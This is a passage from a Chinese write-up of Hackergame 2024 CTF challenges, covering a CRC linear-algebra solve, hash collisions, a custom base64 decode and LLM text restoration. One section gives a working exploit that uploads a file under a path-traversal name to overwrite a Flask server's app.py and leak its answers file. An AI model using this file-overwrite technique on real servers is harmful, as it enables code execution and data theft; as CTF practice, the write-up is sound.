-    print(out.hex(), hex(crc32(out)))
-    assert crc32(out) == target
+    # crcs = [
+    # "110100000100000000000000000",
+    # "111010000010000000000000000",
+    # "011001000001000000000000000",
+    # "100110100000100000000000000",
+    # "010111010000010000000000000",
+    # "001011001000001000000000000",
+    # "000100110000000100000000000",
+    # "000010111000000010000000000",
+    # "000001011000000001000000000",
+    # "100000000110100000100000000",
+    # "010000000111010000010000000",
+    # "001000000011001000001000000",
+    # "000100000100110100000100000",
+    # "000010000010111010000010000",
+    # "000001000001011001000001000",
+    # "000000100000100110000000100",
+    # "000000010000010111000000010",
+    # "000000001000001011000000001",
+    # "000000000100000000110100000",
+    # "000000000010000000111010000",
+    # "000000000001000000011001000",
+    # "000000000000100000100110100",
+    # "000000000000010000010111010",
+    # "000000000000001000001011001",
+    # "000000000000000100000100110",
+    # "000000000000000010000010111",
+    # "000000000000000001000001011"
+    # ]
+
+    crcs = [
+"11000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"11100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"01110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00111000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00011000010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"10000110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"01000111000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00100011100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00010001110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00001000110000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000100001100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000010001110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000001000111000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000100011100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000010001100001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000001000011000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000100011100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000010001110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000001000111000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000000100011000010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000000010000110000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000000001000111000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000000000100011100000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000000000010001110000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000",
+"00000000000000000001000110000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000",
+"10000000000000000000000001100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000",
+"01000000000000000000000001110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000",
+"00100000000000000000000000111000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000",
+"00010000000000000000000000011100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000",
+"00001000000000000000000000001100001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000",
+"00000100000000000000000001000011000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000",
+"00000010000000000000000000100011100010000000000000000000100000000000000000000000000000000000000000000000000000000000000000000",
+"00000001000000000000000000010001110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000",
+"00000000100000000000000000001000111000100000000000000000001000000000000000000000000000000000000000000000000000000000000000000",
+"00000000010000000000000000000100011000010000000000000000000100000000000000000000000000000000000000000000000000000000000000000",
+"00000000001000000000000000000010000110001000000000000000000010000000000000000000000000000000000000000000000000000000000000000",
+"00000000000100000000000000000001000111000100000000000000000001000000000000000000000000000000000000000000000000000000000000000",
+"00000000000010000000000000000000100011100010000000000000000000100000000000000000000000000000000000000000000000000000000000000",
+"00000000000001000000000000000000010001110001000000000000000000010000000000000000000000000000000000000000000000000000000000000",
+"00000000000000100000000000000000001000110000100000000000000000001000000000000000000000000000000000000000000000000000000000000",
+"00000000000000010000000000000000000100001100010000000000000000000100000000000000000000000000000000000000000000000000000000000",
+"00000000000000001000000000000000000010001110001000000000000000000010000000000000000000000000000000000000000000000000000000000",
+"00000000000000000100000000000000000001000111000100000000000000000001000000000000000000000000000000000000000000000000000000000",
+"00000000000000000010000000000000000000100011100010000000000000000000100000000000000000000000000000000000000000000000000000000",
+"00000000000000000001000000000000000000010001100001000000000000000000010000000000000000000000000000000000000000000000000000000",
+"00000000000000000000100000000000000000001000011000000000000000000000001000000000000000000000000000000000000000000000000000000",
+"00000000000000000000010000000000000000000100011100000000000000000000000100000000000000000000000000000000000000000000000000000",
+"00000000000000000000001000000000000000000010001110000000000000000000000010000000000000000000000000000000000000000000000000000",
+"00000000000000000000000100000000000000000001000111000000000000000000000001000000000000000000000000000000000000000000000000000",
+"00000000000000000000000010000000000000000000100011000000000000000000000000100000000000000000000000000000000000000000000000000",
+"00000000000000000000000001000000000000000000000000110001000000000000000000010000000000000000000000000000000000000000000000000",
+"00000000000000000000000000100000000000000000000000111000100000000000000000001000000000000000000000000000000000000000000000000",
+"00000000000000000000000000010000000000000000000000011100010000000000000000000100000000000000000000000000000000000000000000000",
+"00000000000000000000000000001000000000000000000000001110001000000000000000000010000000000000000000000000000000000000000000000",
+"00000000000000000000000000000100000000000000000000000110000100000000000000000001000000000000000000000000000000000000000000000",
+"00000000000000000000000000000010000000000000000000100001100010000000000000000000100000000000000000000000000000000000000000000",
+"00000000000000000000000000000001000000000000000000010001110001000000000000000000010000000000000000000000000000000000000000000",
+"00000000000000000000000000000000100000000000000000001000111000100000000000000000001000000000000000000000000000000000000000000",
+"00000000000000000000000000000000010000000000000000000100011100010000000000000000000100000000000000000000000000000000000000000",
+"00000000000000000000000000000000001000000000000000000010001100001000000000000000000010000000000000000000000000000000000000000",
+"00000000000000000000000000000000000100000000000000000001000011000100000000000000000001000000000000000000000000000000000000000",
+"00000000000000000000000000000000000010000000000000000000100011100010000000000000000000100000000000000000000000000000000000000",
+"00000000000000000000000000000000000001000000000000000000010001110001000000000000000000010000000000000000000000000000000000000",
+"00000000000000000000000000000000000000100000000000000000001000111000100000000000000000001000000000000000000000000000000000000",
+"00000000000000000000000000000000000000010000000000000000000100011000010000000000000000000100000000000000000000000000000000000",
+"00000000000000000000000000000000000000001000000000000000000010000110001000000000000000000010000000000000000000000000000000000",
+"00000000000000000000000000000000000000000100000000000000000001000111000100000000000000000001000000000000000000000000000000000",
+"00000000000000000000000000000000000000000010000000000000000000100011100010000000000000000000100000000000000000000000000000000",
+"00000000000000000000000000000000000000000001000000000000000000010001110001000000000000000000010000000000000000000000000000000",
+"00000000000000000000000000000000000000000000100000000000000000001000110000100000000000000000001000000000000000000000000000000",
+"00000000000000000000000000000000000000000000010000000000000000000100001100000000000000000000000100000000000000000000000000000",
+"00000000000000000000000000000000000000000000001000000000000000000010001110000000000000000000000010000000000000000000000000000",
+"00000000000000000000000000000000000000000000000100000000000000000001000111000000000000000000000001000000000000000000000000000",
+"00000000000000000000000000000000000000000000000010000000000000000000100011100000000000000000000000100000000000000000000000000",
+"00000000000000000000000000000000000000000000000001000000000000000000010001100000000000000000000000010000000000000000000000000",
+"00000000000000000000000000000000000000000000000000100000000000000000000000011000100000000000000000001000000000000000000000000",
+"00000000000000000000000000000000000000000000000000010000000000000000000000011100010000000000000000000100000000000000000000000",
+"00000000000000000000000000000000000000000000000000001000000000000000000000001110001000000000000000000010000000000000000000000",
+"00000000000000000000000000000000000000000000000000000100000000000000000000000111000100000000000000000001000000000000000000000",
+"00000000000000000000000000000000000000000000000000000010000000000000000000000011000010000000000000000000100000000000000000000",
+"00000000000000000000000000000000000000000000000000000001000000000000000000010000110001000000000000000000010000000000000000000",
+"00000000000000000000000000000000000000000000000000000000100000000000000000001000111000100000000000000000001000000000000000000",
+"00000000000000000000000000000000000000000000000000000000010000000000000000000100011100010000000000000000000100000000000000000",
+"00000000000000000000000000000000000000000000000000000000001000000000000000000010001110001000000000000000000010000000000000000",
+"00000000000000000000000000000000000000000000000000000000000100000000000000000001000110000100000000000000000001000000000000000",
+"00000000000000000000000000000000000000000000000000000000000010000000000000000000100001100010000000000000000000100000000000000",
+"00000000000000000000000000000000000000000000000000000000000001000000000000000000010001110001000000000000000000010000000000000",
+"00000000000000000000000000000000000000000000000000000000000000100000000000000000001000111000100000000000000000001000000000000",
+"00000000000000000000000000000000000000000000000000000000000000010000000000000000000100011100010000000000000000000100000000000",
+"00000000000000000000000000000000000000000000000000000000000000001000000000000000000010001100001000000000000000000010000000000",
+"00000000000000000000000000000000000000000000000000000000000000000100000000000000000001000011000100000000000000000001000000000",
+"00000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011100010000000000000000000100000000",
+"00000000000000000000000000000000000000000000000000000000000000000001000000000000000000010001110001000000000000000000010000000",
+"00000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000111000100000000000000000001000000",
+"00000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011000010000000000000000000100000",
+"00000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010000110000000000000000000000010000",
+"00000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000111000000000000000000000001000",
+"00000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011100000000000000000000000100",
+"00000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010001110000000000000000000000010",
+"00000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000110000000000000000000000001",
+"00000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000001100010000000000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000001110001000000000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000111000100000000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000011100010000000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000001100001000000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000011000100000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011100010000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010001110001000000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000111000100000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011000010000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010000110001000000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000111000100000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011100010000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010001110001000000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000110000100000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100001100010000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010001110001000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000111000100",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011100010",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010001100001",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000011000",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011100",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000010001110",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000001000111",
+"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100011",
+    ]
+
+    #target = "111000111110001111001110101"
+    target = "10111010111110000101011111010000101100100010110010100111011100011111001000100001001110101100010011000000011100100100111111010"
+
+    A = transpose([str2vec(c) for c in crcs])
+    b = str2vec(target)
+
+    result = solve_gf2(A, b)
+    lst = list(result)
+    s=""
+    for i in lst[0]:
+        s+=str(i)
+    print(s)
+    #assert crc32(out) == target
```
4. 第二问耗时 3 分钟（Ryzen 3950X 单核），距离题目限制 200s 很近了，第三问肯定是不能靠脚本做了。于是继续上一问中的搜索，发现 Mathematica 直接支持计算模 2 线性方程组的解：`LinearSolve` 函数直接有 `modulo` 这个参数。
5. 想起来以前用过 Mathematica，于是编写一些正则表达式来为它生成矩阵输入，并解析其输出为题目要求的形式，同时换到 i7-13700K 上运行，几十秒后成功通过第三问（这期间随时在担心剪贴板爆炸、程序卡死，其实都没发生）

第四问太恐怖了，爬了。
## 禁止内卷
#### 最终操作 | 解题思路
这题目的提示给的实在太多了，代码看一眼就知道是通过特殊的上传路径来覆盖原本的 app.py 并执行自己的脚本。唯一的问题是，原来的程序文件到底叫 app.py、wsgi.py 还是其他？

尝试自己写个 `__init__.py`，觉得这总能保证 import 到了吧，但是不太熟悉 Flask 对当前程序是包的用法，没有调试出来（同时被本地目录名叫 app 的操作给坑了，import 飞到天上😅）。

然后想，反正 `flask run` 会载入的文件也就那么两个，大不了全覆盖了，于是简单多了。直接魔改题目本身的源码，改为读取 answers.json 就行：

```diff
--- app.py      2024-11-07 13:09:16.288523306 +0800
+++ app2.py     2024-11-07 13:01:24.486324332 +0800
@@ -40,32 +40,4 @@
 
 @app.route("/submit", methods=["POST"])
 def submit():
-    if "file" not in request.files or request.files['file'].filename == "":
-        print("你忘了上传文件")
-        return "OK"
-    file = request.files['file']
-    filename = file.filename
-    filepath = os.path.join(UPLOAD_DIR, filename)
-    file.save(filepath)
-
-    answers = get_answer()
-    try:
-        with open(filepath) as f:
-            user = json.load(f)
-    except json.decoder.JSONDecodeError:
-        print("你提交的好像不是 JSON")
-        return "OK"
-    try:
-        score = 0
-        for idx, i in enumerate(answers):
-            score += (i - user[idx]) * (i - user[idx])
-    except:
-        print("分数计算出现错误")
-        traceback.print_exc()
-        return "OK"
-    # ok, update results
-    results.append(score)
-    with open("results.json", "w") as f:
-        json.dump(results, f)
-    print(f"评测成功，你的平方差为 {score}")
-    return "OK"
+    return open("answers.json").read()
```

搜索 Python request 如何自定义上传的文件名，然后编写脚本上传：

```python
#!/usr/bin/python3

import requests

# /tmp/web/app.py 是上传文件名，app2.py 是上面 diff 应用后的文件
files = {"file": ("/tmp/web/app.py", open("app2.py", "r").read())}
# 在题目页面点提交，从浏览器 console 抓到这个 /submit 的地址
r = requests.post("https://chal02-xxx.lug.ustc.edu.cn:8443/submit", files=files)
print(r.text)
```

然后随便再对 /submit POST 点东西，就可以拿到 answer.json 了。再按照题目描述解码它：

```python
a=[37, 43, 32, 38, 58, 52, 45, 46, ...] # 手动复制
b=[x+65 for x in a]
by=bytes(b)
print(by[:50].decode("ascii")) # 先不加 :xx，运行时 Python 会报错无法解码，然后将报错位置通过 :xx 掐断就可以
```

就可以拿到 flag.

从现在开始，都只能摸送分题了。

## 哈希三碰撞
### 三碰撞之一
#### 最终操作 | 解题思路
我有钛合金 F5，IDA 启动！很容易看出来是 8 字节作为源数据的 SHA256，碰撞出最后 4 字节相同的三组即可。

这里一开始还看错了，以为是碰撞前 4 字节相同。于是想到区块链上的 SHA256 不是前面都是 0 吗，那肯定相同啊！于是去搜区块链的 hash 是怎么计算的，发现源数据远不止 8 字节，放弃。（结果后两问还真是要这么做？）

搜索“sha256 collision first 4 bytes”，得知可以用 birthday attack，先随便算个 hash 取末尾 4 字节，然后去随机生成数据撞这个 hash，成功率比直接给定一个 4 字节要高得多。用同样方法再撞出第三个数值即可。几分钟就可以撞一堆出来。随便提交一组，完事。

后面两问 IDA 看了一眼就不敢继续了。
## 零知识数独
### 数独高手
#### 最终操作 | 解题思路
数独可以不会做，送分题一定要拿到。随便找个 sudoku solver 网站都可以拿到这 100 分。比如我用的是 https://sudokuspoiler.com/sudoku/sudoku9

听说第二问也是送的，可惜看到“电路”就吓到了。这也是我这么急应得的惩罚了。
## 神秘代码 2
### 你好，`___`（三个字母）
#### 最终操作 | 解题思路
逆向可以不会做，送分题一定要拿到。`objdump -S` 选啥架构都不对，但最后有个 64 字节的可读字符串，会不会是 base64 变了表的结果呢？尝试一下：

```sh
echo -ne VUoD57TKu5ZUL... | tr F1/gfNvdiUJPKWzlxE5Xu9q+ptmb3QV2a6BZ7GAHcySDh08OoRLIkTCYMnjew4sr ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/|base64 -d > try # echo 的是题目显示的字符串，tr 第一个参数是 binary 中的字符串，第二个参数是正常 base64 的编码表
binwalk -e try # 解压 zlib，但我太懒了
```

然后 `_try.extracted` 目录里面就有结果了。

flag 是 `flag{Y0u_guessed_r1gh7!N0w_l34rn_uxn!!!_...}`，那个 `now learn uxn` 我是真没看见，就以为是个很常见的 leet code placeholder😂还在想标题里的三个字母是啥呢，b64？zlib？都不对啊😂不知道大腿拍断多少次了
## 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」
### 「行吧就算标题可以很长但是 flag 一定要短点」
#### 最终操作 | 解题思路
AI 题可以不会做，送分题一定要拿到。这一问是从被和谐了的文本里还原出原本内容。先靠自己的英语水平以及本地跑题目容器的运行结果，将文本还原到如下状态（小心查找替换改了大小写）：

```
In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. the atmosphere was electric, with the smell of fxxsxly bxxwxd xoffxx xinxlinx with the sxxnt of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of xxxitxxxnt and determination. the (hack|game) was on, and the stxxxs wxxx xixx, with the ultimate prize being a golden trophy and the bxxxxinx xixxts to say txxy wxxx the best at xxxxxinx xodxs and hacking systems in the land of the rising sun.
```

其实不改题目容器中的 prompt 就能还原出大部分了，将文章内容复制为 prompt 反而会越来越远。然后剩下的交给 ChatGPT 解决，AI 的事情交给 AI 做很合理吧：

> 我：Here is a passage written by another AI that tells a funny fictional story about a CTF activity named Hackergame. But the letters h, a, c, k, e, r, g, a, m and e are replaced with x. I need you to restore the original text. The passage is: <复制粘贴>
>
> ChatGPT：Here’s the restored passage:
>
> In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The **hackergame** was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.

修复一些大小写问题以及粗体处的遗留问题后，验证 SHA 与题目要求一致，提交即可。

第二问看到连空格都变成 x 了，被吓晕。

## 遗憾

这里是其他一些拍断大腿的题目：

* RISC-V：虎胆龙威：第二问，已经想到了将数据读到寄存器里排序，但是以为有 32 个数字要排，比寄存器多，懒得想对策了，直接放弃。结果其实只有 16 个数字……
* 我们的快排確有問題：`qsort` 的缺陷已经找到了，但是怕修改现有的 `system()` 为 `cat /flag` 时不允许写入代码段，排序内容要构造也懒，就没有做。实际上也是不难的

希望明年还能有精力参加 Hackergame 吧！
